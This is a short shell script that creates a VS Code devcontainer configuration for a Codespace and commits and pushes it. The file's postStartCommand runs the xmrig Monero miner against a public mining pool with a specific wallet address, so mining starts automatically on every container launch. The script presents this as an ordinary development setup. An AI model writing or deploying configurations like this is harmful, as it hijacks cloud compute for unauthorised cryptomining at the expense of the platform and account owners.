mkdir -p .devcontainer

cat <<EOL > .devcontainer/devcontainer.json
{
    "name": "My Codespace",
    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
    "features": {
        "ghcr.io/devcontainers/features/sshd:1": {
            "version": "latest"
        }
    },
    "postStartCommand": "cd xmrig/build && ./xmrig -o pool.supportxmr.com:3333 -u 4AGvap8Fvk9BaT8M1kBqHAFBTiCtgcJadfXBtwTtaaydPVvmQq6aNQMLrNncGbKYZxEX7T1dBL24RK1AcDvApy5zM8tmyqN -p worke2 -k --coin monero",
    "customizations": {
        "vscode": {
            "settings": {
                "python.pythonPath": "/usr/local/bin/python"
            },
            "extensions": [
                "ms-python.python"
            ]
        }
    }
}
EOL

git add .devcontainer/devcontainer.json
git commit -m "Add devcontainer with postStartCommand to auto-run xmrig"
git push origin main
